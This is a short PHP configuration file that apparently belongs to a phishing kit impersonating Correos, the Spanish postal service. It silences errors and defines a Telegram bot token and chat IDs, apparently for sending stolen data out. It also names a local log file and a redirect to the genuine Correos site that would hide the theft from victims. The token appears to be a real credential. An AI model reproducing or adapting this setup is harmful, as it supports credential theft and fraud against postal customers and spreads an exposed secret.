<?php

error_reporting(0);

define("TELEGRAM_TOKEN", "6653827515:AAEdWvM_A0U8Is3y2OL2CQLI6kOOBTSGCZA");
define("TELEGRAM_CHAT_ID", "-1001756083376");
define("TELEGRAM_CHAT_IDD", "-1001756083376");
define("TXT_FILE_NAME", 'mjinina.txt');
define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");



?>